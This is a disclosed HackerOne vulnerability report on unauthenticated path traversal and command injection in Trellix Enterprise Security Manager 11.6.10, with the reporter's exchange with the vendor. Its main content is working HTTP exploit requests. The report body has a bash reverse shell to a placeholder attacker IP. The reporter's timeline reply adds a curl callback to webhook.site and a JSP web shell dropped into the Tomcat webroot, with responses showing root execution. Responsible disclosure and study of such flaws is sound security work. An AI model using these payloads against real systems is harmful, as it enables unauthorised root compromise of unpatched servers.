---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/path-traversal
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
  - trigger/unauthenticated
  - fix/input-validation
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2025-01-12
submitted: 2024-11-02T14:40:47.714Z
bounty_usd: null
votes: 60
cve: []
program: "[[programs/trellix|Trellix]]"
reporter: "r4v"
source: "https://hackerone.com/reports/2817658"
title: "Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10"
---
# Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 60 | **Program:** Trellix | **Disclosed:** 2025-01-12

- Report: [https://hackerone.com/reports/2817658](https://hackerone.com/reports/2817658)
- CWE: OS Command Injection
- Submitted: 2024-11-02T14:40:47.714Z

## Report summary

A critical unauthenticated path traversal and command injection vulnerability was identified in Trellix Enterprise Security Manager (ESM) 11.6.10. The ESM's AJP configuration (`ProxyPass /rs ajp://localhost:8009/rs`) allows unauthorized access to internal API endpoints by exploiting a `..;/` path traversal sequence, bypassing directory restrictions. The `/Snowservice/SnowflexAdminServices/ManageNode` endpoint is further vulnerable to command injection in the `name` parameter, allowing remote code execution as root. This vulnerability permits full system compromise via a reverse shell. 

*Tested on version 11.6.10. Other versions may be affected.*

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Product:** Trellix Enterprise Security Manager (ESM)

**Version Tested:** 11.6.10

**Source:** Publicly available trial version from [Trellix Trials](https://www.trellix.com/downloads/trials/?selectedTab=siem) — "Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10."

**Potentially Affected Versions:** Latest version could also be vulnerable

**Vulnerability Type:** Path Traversal, Command Injection

**Severity:** Critical

---

## Summary:
A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows **unauthenticated** access to the internal `Snowservice` API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.

The root cause lies in the way the ESM forwards requests to the AJP service using `ProxyPass`, specifically configured as:

```apache
ProxyPass         /rs  ajp://localhost:8009/rs
```

This configuration permits unintended external access to internal paths by leveraging the `..;/` traversal sequence, which bypasses typical directory restrictions. This technique is further explained in **Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out** by Orange Tsai at Black Hat USA 2018 ([source](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)). The `..;/` sequence bypasses common path validation checks, making it possible to access restricted internal APIs. Combined with command injection vulnerabilities, this leads to a critical security risk.

---

## Product reports - releases affected:
Wherever possible, please test against the latest released version.
  * Tested on Trellix Enterprise Security Manager version 11.6.10 (Linux)
  * Other versions may also be affected (please verify)

---

## Website reports - browsers verified in:
Please provide the full URL.
  * Tested via HTTP requests (no specific browser required)

---

## Steps to reproduce:
1. Access the `/rs/..;/Snowservice/SnowflexAdminServices/CreateNode` endpoint without authentication to confirm unauthenticated access.
2. Submit a request to the `CreateNode` endpoint to verify unauthorized path traversal access to the internal API.
3. Exploit command injection via the `ManageNode` endpoint to execute commands with root privileges.

### Step 1: Unauthenticated API Access via Path Traversal

The following request demonstrates unauthenticated access to the internal API:

#### Request Example:
```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
Host: [ESM IP]
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 118

{
    "serverName": "test132", 
    "ip": "127.0.0.1",
    "port": "1212",
    "peerPort": "1210"
}
```

### Step 2: Remote Code Execution via Command Injection with Root Privileges

The following command injection payload in the `name` parameter provides remote root access:

#### Request Example:
```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: [ESM IP]
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 186

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`", 
            "signal": "Restart"
        }
    ]
}
```

This payload opens a reverse shell to the attacker’s machine, providing root access and full control over the system.

---

## Supporting material/references:
* **Screenshot 1**: screenshot.png - This screenshot shows the HTTP request used to exploit the command injection vulnerability and the reverse shell connection received by the attacker.
* **Screenshot 2**: screenshot2.png - This screenshot displays the process list on the compromised system, showing the injected command being executed as root. It also shows the whole command executed.

---

## Impact

Exploiting this vulnerability allows an attacker to:
- Gain **unauthenticated** access to internal API endpoints through path traversal.
- Execute arbitrary commands as root, compromising the system entirely.

The impact of this vulnerability is rated **Critical** due to the combination of unauthenticated path traversal, insecure proxy forwarding, and command injection.

---

## Recommendations

1. **Secure AJP Proxy Configuration**
   - Review and restrict `ProxyPass` configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.
   - Avoid using ambiguous path traversal characters like `..;/` by implementing additional path validation for all forwarded requests.

2. **Path Validation and Access Control**
   - Implement robust path validation to reject sequences like `..;/` that enable unauthorized access.
   - Ensure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.

3. **Command Injection Prevention**
   - Enforce strict input sanitization, especially for sensitive parameters like `name`. Reject special characters and command syntax in user inputs.
   - Implement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.

4. **Principle of Least Privilege**
   - Avoid running the service as root to reduce potential damage if an exploit occurs.

---

## Impact Summary

This vulnerability in Trellix ESM 11.6.10 allows **unauthenticated** access to an internal API through path traversal enabled by insecure AJP forwarding and lacks input validation, permitting command injection with root execution. Confirmed on the publicly available trial version, this vulnerability likely affects other versions and requires urgent remediation.

---

## Note to Vendor

It is recommended that Trellix verify which versions of the software are affected by this vulnerability. This issue may not be limited to version 11.6.10 and could impact previous versions as well. A thorough review of historical versions is advised to assess the scope of this vulnerability and ensure proper patching across affected releases.

**Thank you for reviewing this report. I am available for any further questions or additional information.**

**Best Regards,**  
Rafal Gill (r4v)

## Timeline

- **Draft Started**
- **Report Filed**
- **2024-11-04** @yps: Hi @ @r4v,

Thank you for taking time to submit the issue , our engineering team is reviewing the report, we will keep you updated.

Regards,
@yps
- **Report Triaged**
- **2024-11-08** @yps: Hi @r4v, 

Can you share the output in burp of the command injection  other than reverse shell ?

Regards,
@yps
- **2024-11-10** @r4v: I am not sure if I understand the question correctly, but for reverse shell the HTTP response will be most probably timeout or something. Only if you exit from reverse shell it manually, the response would be
```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:17:45 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 15
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"status":"OK"}
```
otherwise it could be similar to:

```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:29:52 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 128
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"addlInfo":"org.apache.thrift.transport.TTransportException: java.net.SocketTimeoutException: Read timed out","status":"error"}
```

If you're (for some reason) unable to reproduce the vulnerability with reverse shell, you may try with Burp Collaborator or Webhook.site.

Sample request:

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: 192.168.15.225
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 207

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`curl http://webhook.site/acde4291-64b0-4c2d-b4e3-0c3aeb881c6e`", 
            "signal": "Restart"
        }
    ]
}

```

Sample response:
```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:20:14 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 15
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"status":"OK"}
```
And then observe the incoming HTTP request in Burp Collaborator/Webhook.site.

I didn't investigate the HTTP response is this case, as for remote code execution there are multiple ways obtain the output from the command (without relying on HTTP response), such as reverse shell. However, in case attacker would not be able to obtain reverse shell (e.g. due to the strict firewall rules in the company), there's still possibility to drop webshell in existing webserver. To do so, submit the following request:

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: 192.168.15.225
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 419

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`echo '<% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream in = p.getInputStream(); int a = -1; while ((a = in.read()) != -1) out.print((char)a); } %>' > /etc/tomcat/webapps/ROOT/shell.jsp`", 
            "signal": "Restart"
        }
    ]
}
```

The response should be like:

```http
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:50:23 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
vary: Origin
Content-Type: application/json
Content-Length: 15
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

{"status":"OK"}
```

Then just navigate to our webshell with submitting sample command (id):

```http
GET /rs/..;/shell.jsp?cmd=id HTTP/1.0
Host: 192.168.15.225
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36

```

and observe the response:

```
HTTP/1.1 200 200
Date: Sat, 09 Nov 2024 23:50:38 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Set-Cookie: █████████
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 40
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; form-action 'self'; media-src 'self'; font-src 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self' esm://*;frame-ancestors 'self'
Connection: close

uid=0(root) gid=0(root) groups=0(root)

```
- **2024-11-12** @yps: Hi @r4v,

Thank you for your response, we were able to validate both vulnerabilities. Will keep you posted with any further updates.

Regards,
@yps
- **2024-11-14** @yps: Hi @r4v,

We are planning to release the fix and publish a bulletin and CVE. How would you like to be credited in the bulletin.

Regards,
@yps
- **2024-11-15** @r4v: Just name and surname will be fine, as it's my private research: Rafal Gill

Will the bulletin be public or only available to customers? If only to customers, can I receive the access to it after it will be published?
- **2024-11-20** @yps: Hi @r4v,

The bulletin will be available only for customers and we can share you a copy after it is published.

Regards,
@yps
- **Report Resolved**
- **2024-12-13** @r4v: Hello @yps ,

Thanks for that PDF and for the CVE. Can we disclose it e.g. in 14 days? I believe that ~30 days after releasing patch would be safe enough for your customers to disclose.

Best regards,

Rafał Gill
- **Agreed On Going Public**
- **Report Became Public**
